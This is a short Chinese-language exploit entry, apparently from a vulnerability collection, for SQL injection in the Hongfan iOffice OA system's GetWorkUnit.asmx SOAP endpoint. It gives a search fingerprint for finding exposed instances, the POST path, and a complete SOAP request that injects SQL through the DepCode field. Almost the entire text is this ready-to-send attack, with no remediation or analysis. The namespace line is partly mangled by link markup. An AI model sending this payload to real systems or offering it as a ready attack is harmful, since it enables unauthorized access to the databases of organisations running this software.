# 红帆OA-GetWorkUnit.asmx存在SQL注入漏洞

红帆 ｜ SQL注入 ｜ —
- **指纹**：`app="红帆-ioffice"`
- **请求**：`POST /ioffice/prg/interface/GetWorkUnit.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="
[http://www.w3.org/2001/XMLSchema-instance"](http://www.w3.org/2001/XMLSchema-instance%22) xmlns:xsd="http://www.w3.org/2001
/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetDutyDetail xmlns="http://tempuri.org/">
<DepCode>1' and @@version>0;--</DepCode>
<DutyDate>string</DutyDate>
<DutyName>string</DutyName>
</GetDutyDetail>
</soap:Body>
</soap:Envelope>
```